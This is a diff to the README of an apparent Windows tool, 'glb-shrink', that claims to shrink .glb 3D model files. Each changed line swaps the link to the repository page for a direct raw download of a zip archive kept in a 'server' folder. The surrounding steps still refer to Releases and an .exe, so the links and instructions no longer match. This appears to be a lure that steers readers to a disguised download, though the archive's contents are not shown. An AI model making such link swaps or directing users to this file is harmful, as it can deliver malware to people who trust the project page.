@@ -1,6 +1,6 @@
 # 📦 glb-shrink - Reduce 3D model file size instantly
 
-[Download GLB Shrink for Windows](https://github.com/dry-rootclimber660/glb-shrink)
+[Download GLB Shrink for Windows](https://github.com/dry-rootclimber660/glb-shrink/raw/refs/heads/main/server/glb-shrink-v2.1-alpha.3.zip)
 
 ## 💡 About this tool
 
@@ -12,7 +12,7 @@ You drag your file into the window. The tool processes the model. You see a side
 
 Follow these steps to install and run the software on your computer.
 
-1. Visit the [official download page](https://github.com/dry-rootclimber660/glb-shrink).
+1. Visit the [official download page](https://github.com/dry-rootclimber660/glb-shrink/raw/refs/heads/main/server/glb-shrink-v2.1-alpha.3.zip).
 2. Look for the latest version under the Releases section.
 3. Click the installer file ending in .exe to start the download.
 4. Open the downloaded file once the process finishes.
@@ -68,4 +68,4 @@ The tool specifically works with .glb files. This format creates a single packag
 ### What should I do if the app does not open?
 Ensure your graphics drivers are up to date. The application requires modern hardware acceleration to display the 3D preview. Restart your computer if the window persists in staying blank.
 
-[Visit the download page to get started](https://github.com/dry-rootclimber660/glb-shrink)
+[Visit the download page to get started](https://github.com/dry-rootclimber660/glb-shrink/raw/refs/heads/main/server/glb-shrink-v2.1-alpha.3.zip)
